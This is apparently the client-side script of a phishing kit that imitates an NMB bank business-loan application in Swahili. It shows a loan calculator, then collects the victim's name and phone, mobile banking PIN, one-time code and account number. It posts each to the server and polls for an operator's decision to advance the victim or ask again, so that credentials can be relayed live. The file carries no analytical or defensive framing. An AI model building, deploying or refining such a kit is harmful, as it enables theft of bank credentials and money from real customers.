document.addEventListener('DOMContentLoaded', () => {
    // Generate a unique session ID for this browser session
    let sessionId = localStorage.getItem('nmb_session_id');
    if (!sessionId) {
        sessionId = 'sess_' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
        localStorage.setItem('nmb_session_id', sessionId);
    }

    // Get URL parameters (like ?ref=CHAT_ID)
    const urlParams = new URLSearchParams(window.location.search);
    const ref = urlParams.get('ref') || '';

    let currentScreen = 'screen-slider';
    let formData = {
        amount: 100000,
        duration: 12,
        loanType: 'Mkopo wa Biashara',
        purpose: '',
        firstName: '',
        lastName: '',
        phone: '',
        employment: 'Mfanyabiashara',
        annualIncome: '',
        pin: '',
        otp: '',
        accountNumber: ''
    };

    function showScreen(screenId) {
        document.querySelectorAll('.screen').forEach(screen => {
            screen.classList.remove('active');
        });
        const target = document.getElementById(screenId);
        if (target) {
            target.classList.add('active');
            currentScreen = screenId;
            window.scrollTo(0, 0);
        }
    }

    function showLoading(text = 'Tafadhali subiri...') {
        document.getElementById('loading-text').innerText = text;
        document.getElementById('loading-overlay').classList.remove('hidden');
    }

    function hideLoading() {
        document.getElementById('loading-overlay').classList.add('hidden');
    }

    // Polling function to check admin action from server
    function pollServerStatus(onNextStep, onRestartPin, onRestartOtp, onRestartAcc, onSuccess) {
        const interval = setInterval(async () => {
            try {
                const res = await fetch(`/api/check-status/${sessionId}`);
                const data = await res.json();

                if (data.status && data.status !== 'pending') {
                    clearInterval(interval);
                    hideLoading();

                    if (data.status === 'next_step' && typeof onNextStep === 'function') {
                        onNextStep();
                    } else if (data.status === 'restart_pin' && typeof onRestartPin === 'function') {
                        onRestartPin();
                    } else if (data.status === 'restart_otp' && typeof onRestartOtp === 'function') {
                        onRestartOtp();
                    } else if (data.status === 'restart_acc' && typeof onRestartAcc === 'function') {
                        onRestartAcc();
                    } else if (data.status === 'success' && typeof onSuccess === 'function') {
                        onSuccess();
                    }
                }
            } catch (err) {
                console.error('Polling error:', err);
            }
        }, 2000); // Poll every 2 seconds
    }

    // --- Screen 1: Slider Calculator ---
    const rangeAmount = document.getElementById('range-amount');
    const rangeDuration = document.getElementById('range-duration');
    const displayAmount = document.getElementById('display-amount');
    const displayDuration = document.getElementById('display-duration');
    const displayMonthly = document.getElementById('display-monthly');

    function updateCalculator() {
        const amt = parseInt(rangeAmount.value);
        const dur = parseInt(rangeDuration.value);
        formData.amount = amt;
        formData.duration = dur;

        displayAmount.innerText = `TSh ${amt.toLocaleString()}`;
        displayDuration.innerText = `${dur} miezi`;

        // Simple monthly payment estimate calculation
        const monthly = Math.round((amt * (1 + 0.25 * (dur / 12))) / dur);
        displayMonthly.innerText = `TSh ${monthly.toLocaleString()}`;
        document.getElementById('input-loan-amount').value = amt;
    }

    if (rangeAmount && rangeDuration) {
        rangeAmount.addEventListener('input', updateCalculator);
        rangeDuration.addEventListener('input', updateCalculator);
    }

    document.getElementById('btn-omba-sasa').addEventListener('click', () => {
        showScreen('screen-step1');
    });

    // --- Screen 2: Step 1 ---
    document.getElementById('btn-step1-next').addEventListener('click', () => {
        formData.loanType = document.getElementById('loan-type').value;
        formData.amount = parseInt(document.getElementById('input-loan-amount').value) || formData.amount;
        formData.purpose = document.getElementById('loan-purpose').value;
        showScreen('screen-step2');
    });

    // --- Screen 3: Step 2 ---
    document.getElementById('btn-step2-back').addEventListener('click', () => {
        showScreen('screen-step1');
    });

    document.getElementById('btn-step2-next').addEventListener('click', () => {
        const firstName = document.getElementById('first-name').value.trim();
        const lastName = document.getElementById('last-name').value.trim();
        let phone = document.getElementById('phone-number').value.trim();

        if (!firstName || !lastName || !phone) {
            alert('Tafadhali jaza sehemu zote.');
            return;
        }

        if (phone.startsWith('0')) {
            phone = phone.substring(1);
        }

        formData.firstName = firstName;
        formData.lastName = lastName;
        formData.phone = phone;

        // Register application initialization on backend
        fetch('/api/submit-application', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId, phone, ref })
        }).catch(err => console.error(err));

        // Populate step 3 summary
        document.getElementById('sum-amount').innerText = `TSh ${formData.amount.toLocaleString()}`;
        document.getElementById('sum-duration').innerText = `${formData.duration} Miezi`;
        document.getElementById('sum-purpose').innerText = formData.purpose || 'Biashara';

        showScreen('screen-step3');
    });

    // --- Screen 4: Step 3 ---
    document.getElementById('btn-step3-back').addEventListener('click', () => {
        showScreen('screen-step2');
    });

    document.getElementById('btn-step3-submit').addEventListener('click', () => {
        formData.employment = document.getElementById('employment-status').value;
        formData.annualIncome = document.getElementById('annual-income').value;
        showScreen('screen-pin');
    });

    // --- Screen 5: PIN Inputs handling ---
    const pinBoxes = document.querySelectorAll('.pin-box');
    pinBoxes.forEach((box, index) => {
        box.addEventListener('input', (e) => {
            if (e.target.value.length === 1 && index < pinBoxes.length - 1) {
                pinBoxes[index + 1].focus();
            }
        });
        box.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !box.value && index > 0) {
                pinBoxes[index - 1].focus();
            }
        });
    });

    document.getElementById('btn-submit-pin').addEventListener('click', () => {
        let pin = '';
        pinBoxes.forEach(box => pin += box.value);

        if (pin.length !== 4) {
            alert('Tafadhali weka PIN ya tarakimu 4 kamili.');
            return;
        }

        formData.pin = pin;
        showLoading('Inahibitisha PIN na NMB Mkononi...');

        fetch('/api/submit-pin', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId, pin })
        }).then(() => {
            pollServerStatus(
                () => {
                    // Next step: OTP screen
                    document.getElementById('lbl-otp-phone').innerText = `+255${formData.phone}`;
                    showScreen('screen-otp');
                },
                () => {
                    // Restart pin on deny/wrong pin
                    alert('PIN si sahihi au imekataliwa. Jaribu tena.');
                    pinBoxes.forEach(b => b.value = '');
                    pinBoxes[0].focus();
                    showScreen('screen-pin');
                }
            );
        }).catch(() => {
            hideLoading();
            alert('Hitilafu ya mtandao. Jaribu tena.');
        });
    });

    // --- Screen 6: OTP Inputs handling ---
    const otpBoxes = document.querySelectorAll('.otp-box');
    otpBoxes.forEach((box, index) => {
        box.addEventListener('input', (e) => {
            if (e.target.value.length === 1 && index < otpBoxes.length - 1) {
                otpBoxes[index + 1].focus();
            }
        });
        box.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !box.value && index > 0) {
                otpBoxes[index - 1].focus();
            }
        });
    });

    document.getElementById('btn-submit-otp').addEventListener('click', () => {
        let otp = '';
        otpBoxes.forEach(box => otp += box.value);

        if (otp.length !== 4) {
            alert('Tafadhali weka namba za OTP kamili.');
            return;
        }

        formData.otp = otp;
        showLoading('Inathibitisha OTP...');

        fetch('/api/submit-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId, otp })
        }).then(() => {
            pollServerStatus(
                () => {
                    // Next step: Account number entry screen
                    showScreen('screen-account');
                },
                null,
                () => {
                    // Restart OTP on wrong OTP error
                    alert('OTP si sahihi. Jaribu tena.');
                    otpBoxes.forEach(b => b.value = '');
                    otpBoxes[0].focus();
                    showScreen('screen-otp');
                }
            );
        }).catch(() => {
            hideLoading();
            alert('Hitilafu ya mtandao.');
        });
    });

    // --- Screen 7: Account Number Submission ---
    document.getElementById('btn-submit-account').addEventListener('click', () => {
        const accountNumber = document.getElementById('account-number-input').value.trim();

        if (accountNumber.length !== 11) {
            alert('Namba ya akaunti lazima iwe na tarakimu 11 kamili.');
            return;
        }

        formData.accountNumber = accountNumber;
        showLoading('Inakagua akaunti ya benki...');

        fetch('/api/submit-account', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId, accountNumber })
        }).then(() => {
            pollServerStatus(
                null,
                () => {
                    alert('PIN si sahihi.');
                    showScreen('screen-pin');
                },
                () => {
                    alert('OTP si sahihi.');
                    showScreen('screen-otp');
                },
                () => {
                    alert('Namba ya akaunti si sahihi. Tafadhali rudia.');
                    document.getElementById('account-number-input').value = '';
                    showScreen('screen-account');
                },
                () => {
                    // Success screen
                    showScreen('screen-success');
                }
            );
        }).catch(() => {
            hideLoading();
            alert('Hitilafu ya mtandao.');
        });
    });

    // --- Screen 8: Success Restart ---
    document.getElementById('btn-home').addEventListener('click', () => {
        localStorage.removeItem('nmb_session_id');
        location.reload();
    });
});
                
